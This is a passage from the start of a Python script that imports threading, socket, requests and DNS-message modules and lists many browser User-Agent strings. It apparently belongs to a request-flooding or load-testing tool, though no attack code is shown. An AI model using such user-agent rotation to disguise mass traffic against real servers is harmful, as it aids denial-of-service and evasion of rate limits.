import os
import sys
import logging
import signal
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import socket
import requests
import argparse
from datetime import datetime

# DNS imports (requires dnspython library)
try:
    from dns import message as dns_message
    from dns import rdatatype
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False
    dns_message = None
    rdatatype = None

# Default User-Agent list
default_user_agents = [
'Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)',
'Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)',
'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 6.0; tr) Opera 10.10',
'Mozilla/4.0 (compatible; MSIE 6.0; X11; Linux i686; de) Opera 10.10',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; FDM; .NET CLR 1.1.4322; .NET4.0C; .NET4.0E; Tablet PC 2.0)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; InfoPath.2; .NET4.0C; .NET4.0E)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; AskTB5.5)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C)',
'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 7.1; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C)',
'Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.51',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; ko) Opera 10.53',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E; MS-RTC LM 8; Zune 4.7)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; Zune 4.0)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; Zune 4.7)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; Zune 4.7; InfoPath.3)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; InfoPath.3; .NET4.0C; .NET4.0E) chromeframe/8.0.552.224',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 3.0)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; msn OptimizedIE8;ZHCN)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8)',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; en) Opera 10.62',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00',
'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)',
'Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; de) Opera 10.62',
'Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00',
'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)',
'Mozilla/5.0 ( ; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
'Mozilla/5.0 (Android 2.2; Windows; U; Windows NT 6.1; en-US) AppleWebKit/533.19.4 (KHTML,like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Linux i686; U; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b11pre) Gecko/20110126 Firefox/4.0b11pre',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b8) Gecko/20100101 Firefox/4.0b8',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6) AppleWebKit/534.24 (KHTML,like Gecko) Chrome/11.0.696.12 Safari/534.24',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_6) AppleWebKit/534.24 (KHTML,like Gecko) Chrome/11.0.698.0 Safari/534.24',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) AppleWebKit/534.24 (KHTML,like Gecko) Chrome/11.0.696.0 Safari/534.24',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4 GTB5',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; fr; rv:1.9.1b4) Gecko/20090423 Firefox/3.5b4',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; pl; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 FBSMTWB',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; de; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 GTB5',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.6; en-US; rv:1.9.2) Gecko/20091218 Firefox 3.6b5',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.7; en-US; rv:1.9.2.2) Gecko/20100316 Firefox/3.6.2',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; en-gb) AppleWebKit/528.4+ (KHTML, like Gecko) Version/4.0dp1 Safari/526.11.2',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; en-us) AppleWebKit/528.4+ (KHTML, like Gecko) Version/4.0dp1 Safari/526.11.2',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-gb) AppleWebKit/528.10+ (KHTML, like Gecko) Version/4.0dp1 Safari/526.11.2',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.1 Safari/530.18',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/4.0.1 Safari/530.18',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; en-us) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.3 Safari/531.21.10',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; fi-fi) AppleWebKit/531.9 (KHTML, like Gecko) Version/4.0.3 Safari/531.9',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; fr-fr) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; it-it) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; ja-jp) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; nl-nl) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; zh-cn) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; zh-tw) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_1; nl-nl) AppleWebKit/532.3+ (KHTML, like Gecko) Version/4.0.3 Safari/531.9',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; de-at) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; ja-jp) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; ru-ru) AppleWebKit/533.2+ (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; ca-es) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; de-de) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; el-gr) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-au) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us) AppleWebKit/531.21.11 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us) AppleWebKit/533.4+ (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; en-us) AppleWebKit/534.1+ (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; it-it) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; ja-jp) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; ko-kr) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; ru-ru) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; zh-cn) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.210 Safari/534.10',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.0 Safari/534.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.127 Safari/534.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; en-US) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/11.0.655.0 Safari/534.17',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_4; th-th) AppleWebKit/533.17.8 (KHTML, like Gecko) Version/5.0.1 Safari/533.17.8',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; ar) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; de-de) AppleWebKit/534.15+ (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.0 Safari/534.13',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.15 Safari/534.13',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.639.0 Safari/534.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_5; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.204',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; de-de) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.134 Safari/534.16',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.18 (KHTML, like Gecko) Chrome/11.0.660.0 Safari/534.18',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-US) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-gb) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-us) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; es-es) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; fr-ch) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; fr-fr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; it-it) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ko-kr) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; sv-se) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; zh-cn) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-us) AppleWebKit/534.16+ (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_7; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7; en-us) AppleWebKit/533.4 (KHTML, like Gecko) Version/4.1 Safari/533.4',
'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_7_0; en-US) AppleWebKit/534.21 (KHTML, like Gecko) Chrome/11.0.678.0 Safari/534.21',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko/20081212 Mozilla/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/526.9 (KHTML, like Gecko) Version/4.0dp1 Safari/526.8',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; da-dk) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; de) AppleWebKit/528.4+ (KHTML, like Gecko) Version/4.0dp1 Safari/526.11.2',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; de-de) AppleWebKit/533.16 (KHTML, like Gecko) Version/4.1 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; en) AppleWebKit/528.4+ (KHTML, like Gecko) Version/4.0dp1 Safari/526.11.2',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; hu-hu) AppleWebKit/531.21.8 (KHTML, like Gecko) Version/4.0.4 Safari/531.21.10',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; ja-jp) AppleWebKit/533.16 (KHTML, like Gecko) Version/4.1 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; nl-nl) AppleWebKit/533.16 (KHTML, like Gecko) Version/4.1 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; tr) AppleWebKit/528.4+ (KHTML, like Gecko) Version/4.0dp1 Safari/526.11.2',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_7; en-us) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; en-us) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; en-us) AppleWebKit/532.0+ (KHTML, like Gecko) Version/4.0.3 Safari/531.9',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; en-us) AppleWebKit/532.0+ (KHTML, like Gecko) Version/4.0.3 Safari/531.9.2009',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; zh-cn) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27',
'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.43 Safari/534.24',
'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.25 (KHTML, like Gecko) Chrome/12.0.706.0 Safari/534.25',
'Mozilla/5.0 (Windows NT 5.1; U; Firefox/3.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53',
'Mozilla/5.0 (Windows NT 5.1; U; Firefox/4.5; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53',
'Mozilla/5.0 (Windows NT 5.1; U; Firefox/5.0; en; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53',
'Mozilla/5.0 (Windows NT 5.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00',
'Mozilla/5.0 (Windows NT 5.1; U; pl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00',
'Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.8.1) Gecko/20091102 Firefox/3.5.5',
'Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.53',
'Mozilla/5.0 (Windows NT 5.1; U; zh-cn; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70',
'Mozilla/5.0 (Windows NT 5.1; rv:2.0b13pre) Gecko/20110223 Firefox/4.0b13pre',
'Mozilla/5.0 (Windows NT 5.1; rv:2.0b8pre) Gecko/20101127 Firefox/4.0b8pre',
'Mozilla/5.0 (Windows NT 5.1; rv:2.0b9pre) Gecko/20110105 Firefox/4.0b9pre',
'Mozilla/5.0 (Windows NT 5.2; U; ru; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.70',
'Mozilla/5.0 (Windows NT 5.2; rv:2.0b13pre) Gecko/20110304 Firefox/4.0b13pre',
'Mozilla/5.0 (Windows NT 6.0) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24',
'Mozilla/5.0 (Windows NT 6.0; U; ja; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.00',
'Mozilla/5.0 (Windows NT 6.0; U; tr; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 10.10',
'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.34 Safari/534.24',
'Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.699.0 Safari/534.24',
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.694.0 Safari/534.24',
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.3 Safari/534.24',
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.697.0 Safari/534.24',
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.699.0 Safari/534.24',
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24',
'Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01',
'Mozilla/5.0 (Windows NT 6.1; U; en-GB; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.51',
'Mozilla/5.0 (Windows NT 6.1; U; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.12 Safari/534.24',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/12.0.702.0 Safari/534.24',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b11pre) Gecko/20110128 Firefox/4.0b11pre',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b6pre) Gecko/20100903 Firefox/4.0b6pre',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20100101 Firefox/4.0b7',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20101111 Firefox/4.0b7',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8pre',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b10pre) Gecko/20110118 Firefox/4.0b10pre',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b11pre) Gecko/20110128 Firefox/4.0b11pre',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b11pre) Gecko/20110129 Firefox/4.0b11pre',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b11pre) Gecko/20110131 Firefox/4.0b11pre',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8pre',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101128 Firefox/4.0b8pre',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b8pre) Gecko/20101213 Firefox/4.0b8pre',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b9pre) Gecko/20101228 Firefox/4.0b9pre',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110323 Firefox/4.2a1pre',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110324 Firefox/4.2a1pre',
'Mozilla/5.0 (Windows NT 6.1; rv:1.9) Gecko/20100101 Firefox/4.0',
'Mozilla/5.0 (Windows NT 6.1; rv:2.0) Gecko/20110319 Firefox/4.0',
'Mozilla/5.0 (Windows NT 6.1; rv:2.0b10) Gecko/20110126 Firefox/4.0b10',
'Mozilla/5.0 (Windows NT 6.1; rv:2.0b10pre) Gecko/20110113 Firefox/4.0b10pre',
'Mozilla/5.0 (Windows NT 6.1; rv:2.0b11pre) Gecko/20110126 Firefox/4.0b11pre',
'Mozilla/5.0 (Windows NT 6.1; rv:2.0b6pre) Gecko/20100903 Firefox/4.0b6pre Firefox/4.0b6pre',
'Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre',
'Mozilla/5.0 (Windows NT) AppleWebKit/534.20 (KHTML, like Gecko) Chrome/11.0.672.2 Safari/534.20',
'Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))',
'Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-en) AppleWebKit/533.16 (KHTML, like Gecko) Version/4.1 Safari/533.16',
'Mozilla/5.0 (Windows; U; Windows NT 5.0; ru; rv:1.9.1.13) Gecko/20100914 Firefox/3.5.13',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; cs-CZ) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7',
'Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.9.2.4) Gecko/20100611 Firefox/3.6.4',
